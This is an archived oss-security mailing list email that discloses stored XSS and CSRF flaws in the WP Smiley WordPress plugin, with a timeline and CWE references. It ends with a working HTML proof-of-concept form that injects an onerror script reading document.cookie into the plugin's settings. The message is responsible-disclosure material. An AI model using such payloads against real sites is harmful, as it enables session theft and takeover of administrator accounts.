X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9016" "Friday" "29" "May" "2015" "14:40:01" "+0300" "Henri Salo" "Henri.Salo@nixu.com" "<20150529114001.GB739@nixu.com>" "218" "[oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress" nil nil nil "5" "2015052911:40:01" "[oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress" (number mark "U       Henri.Salo@n May 29  218/9016  " thread-indent "\"[oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32041 invoked by uid 550); 29 May 2015 12:01:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11520 invoked from network); 29 May 2015 11:40:14 -0000
Message-ID: <20150529114001.GB739@nixu.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"; x-action=pgp-signed
Content-Transfer-Encoding: quoted-printable
User-Agent: Mutt/1.5.23 (2014-03-12)
CC: <cve-assign@mitre.org>, <joni.hauhia@nixu.com>
Date: Fri, 29 May 2015 14:40:01 +0300
From: Henri Salo <Henri.Salo@nixu.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request: XSS and CSRF in WP Smiley plugin for WordPress
To: <oss-security@lists.openwall.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

We found following vulnerabilities with Joni Hauhia. Could you assign CVE f=
or
these issues, thanks.

Product: WordPress plugin wp-smiley
Plugin page: https://wordpress.org/plugins/wp-smiley/
Developer: As247 (no contact information available)
Vulnerability Type:
  CWE-79: Cross-site scripting
  CWE-352: Cross-Site Request Forgery
Vulnerable Versions: 1.4.1
Fixed Version: N/A
Solution Status: N/A
Vendor Notification: 2015-03-24
Public Disclosure: 2015-05-29

Vulnerability details:

WP Smiley plugin for WordPress contains a flaw that allows a stored
cross-site-scripting (XSS) attack. This flaw exists because the smilies4wp.=
php
script does not validate input properly before returning it to users. This
allows an authenticated remote attacker to create a specially crafted reque=
st
that would execute arbitrary script code in a user's browser session within=
 the
trust relationship between their browser and the server.

Editor-level user account can use this cross-site scripting vulnerability
against Administrator-level users.

Root cause:

The software incorrectly sanitizes user-controllable input before it is pla=
ced
in output that is used as a web page that is served to users.

Proof-of-concept:

This vulnerability can be demonstrated with following cross-site request fo=
rgery
PoC below.

Notes:

Other parameters are also possibly insecure (not tested). Other versions not
tested.

References:

Cross-site Scripting:
    http://cwe.mitre.org/data/definitions/79.html
    https://scapsync.com/cwe/CWE-79
    https://en.wikipedia.org/wiki/Cross-site_scripting

Cross-Site Request Forgery:
    http://cwe.mitre.org/data/definitions/352.html
    https://scapsync.com/cwe/CWE-352
    https://en.wikipedia.org/wiki/Cross-site_request_forgery

Timeline:

2015-03-24: Notification about vulnerability for WordPress plugins team
2015-03-24: CVE request from MITRE (no response)
2015-03-25: WordPress plugins team responds and disables plugin from archive
2015-04-10: Sent emails to sites, which I knew using this plugin
2015-04-15: Asked status of CVE from MITRE (no response)
2015-05-29: Public disclosure

CSRF XSS PoC:

<html>
  <body>
    <form action=3D"https://example.com/wp-admin/options-general.php?page=
=3Dsmilies4wp.php" method=3D"POST">
      <input type=3D"hidden" name=3D"s4w&#45;disp" value=3D"&quot;&gt;" />
      <input type=3D"hidden" name=3D"s4w&#45;cfid" value=3D"comment" />
      <input type=3D"hidden" name=3D"s4w&#45;more" value=3D"More&gt;&gt;&qu=
ot;&gt;&lt;img&#32;src&#61;&apos;&#35;&apos;&#32;onerror&#61;alert&#40;docu=
ment&#46;cookie&#41;&#32;&#47;&gt;" />
      <input type=3D"hidden" name=3D"s4w&#45;less" value=3D"Less&lt;&lt;" />
      <input type=3D"hidden" name=3D"s4w&#45;cp" value=3D"1" />
      <input type=3D"hidden" name=3D"s4w&#45;cc" value=3D"1" />
      <input type=3D"hidden" name=3D"s4w&#45;cfa" value=3D"1" />
      <input type=3D"hidden" name=3D"s4w&#45;update" value=3D"Update&#32;=
=EF=BF=BD&#187;" />
      <input type=3D"hidden" name=3D"icon&#95;evil&#124;gif&#91;&#93;" valu=
e=3D"&#58;&#41;" />
      <input type=3D"hidden" name=3D"icon&#95;evil&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;surprised&#124;gif&#91;&#93;"=
 value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;surprised&#124;gif&#91;&#93;"=
 value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;question&#124;gif&#91;&#93;" =
value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;question&#124;gif&#91;&#93;" =
value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;mad&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;mad&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;confused&#124;gif&#91;&#93;" =
value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;confused&#124;gif&#91;&#93;" =
value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;twisted&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;twisted&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;neutral&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;neutral&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;mrgreen&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;mrgreen&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;redface&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;redface&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;razz&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;razz&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;smile&#124;gif&#91;&#93;" val=
ue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;smile&#124;gif&#91;&#93;" val=
ue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;cool&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;cool&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;exclaim&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;exclaim&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;lol&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;lol&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;wink&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;wink&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;cry&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;cry&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;biggrin&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;biggrin&#124;gif&#91;&#93;" v=
alue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;idea&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;idea&#124;gif&#91;&#93;" valu=
e=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;rolleyes&#124;gif&#91;&#93;" =
value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;rolleyes&#124;gif&#91;&#93;" =
value=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;eek&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;eek&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;arrow&#124;gif&#91;&#93;" val=
ue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;arrow&#124;gif&#91;&#93;" val=
ue=3D"" />
      <input type=3D"hidden" name=3D"icon&#95;sad&#124;gif&#91;&#93;" value=
=3D"" />
      <input type=3D"hidden" name=3D"s4w&#45;style" value=3D"&#9;&#46;s4w&#=
45;smilies&#32;&#123;&#13;&#10;&#9;text&#45;align&#58;&#32;center&#59;&#13;=
&#10;&#9;position&#58;relative&#59;&#13;&#10;&#9;height&#58;0px&#59;&#13;&#=
10;&#125;&#13;&#10;&#46;s4w&#45;smilies&#45;content&#32;&#123;&#13;&#10;&#9=
;width&#58;&#32;300px&#59;&#13;&#10;&#9;padding&#58;&#32;3px&#59;&#13;&#10;=
&#9;line&#45;height&#58;&#32;120&#37;&#59;&#13;&#10;&#9;position&#58;absolu=
te&#59;&#13;&#10;&#9;border&#58;&#32;1px&#32;solid&#32;&#35;BFCAD2&#59;&#13=
;&#10;&#9;background&#58;&#35;fff&#59;&#13;&#10;&#9;left&#58;160px&#59;&#13=
;&#10;&#9;top&#58;&#45;10px&#59;&#13;&#10;&#9;&#13;&#10;&#125;&#13;&#10;&#4=
6;wp&#45;smiley&#45;button&#32;&#123;&#13;&#10;border&#58;&#32;1px&#32;soli=
d&#32;&#35;ccc&#59;&#13;&#10;margin&#58;&#32;1px&#59;&#13;&#10;padding&#58;=
&#32;2px&#59;&#13;&#10;&#125;&#13;&#10;&#46;wp&#45;smiley&#45;button&#58;ho=
ver&#32;&#123;&#13;&#10;cursor&#58;pointer&#59;&#13;&#10;filter&#58;progid&=
#58;DXImageTransform&#46;Microsoft&#46;Alpha&#40;opacity&#61;60&#41;&#59;&#=
13;&#10;&#45;moz&#45;opacity&#58;&#32;0&#46;6&#59;&#13;&#10;&#125;" />
      <input type=3D"submit" value=3D"Submit request" />
    </form>
  </body>
</html>

- --=20
Henri Salo
Security Specialist, Nixu Oy
Mobile: +358 40 770 5733
PL 39 FIN (Keilaranta 15)
FIN-02151 Espoo, Finland
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJVaFARAAoJEHu3+uinl6paKbkP/0/77ILgY2/T+nybAinYTSy+
JWs76w2UL9lyh1lRo3g+CE7RfTj56RB6tObZ6phMahgZKo/w6sVllk0L/MS8G1QR
pHaTsTnpAR0rqFE8fqzPQ4QsQ0Zv1Exn+FVXke6qF0RzGVdXwVoiZseTg2wAxOWg
zqvlAPGd2dQvvTmmUIBj8QTfNw8Z1jJhxNdVQ5fhg5fNPjcRzBO5pfeIeLu6yrvs
717ATOsInJ19iZKVw6IrId12XBvKmX3VDX2HJMY0vwFUSmdEUSNUsgOV6QsAHu+I
EffEUJYDPIuC4zaEo7dT4OwwzjE8YPQ87xUW1cXMEWf8619PRj0GQ0fQuQ+q/Zl4
A6RmayvvGLSu4ogsbb5HFJubCdFuRR0y3HXMXbVCQZdeRzDjgJAiFjpS0zRG8W/q
Hwpco++dSJowSvyiouk9SZA0Zf9t69Ro4nIYUgMrn+BfZFII7YIlFfuWXD2qpPsE
mxlsCkwFAta2I4fZXDtl0QJqwqghs4PexeMqFhCfN3BeXLeItZuON9cL0X6av+oZ
O3P5qt4D0lb22t/Onj0VDx/wkK8ZQOifMdluHGLb7HOnoIpELlpfYwo+b4NaoDIh
oIGDm97IGyDByejNBQ97XNCvQoy42WNhpAeCqIW6eXcMYssO0r4uhZmAvSbzWASZ
yrT8K8gJgUBnXwS0XP10
=3DchYh
-----END PGP SIGNATURE-----
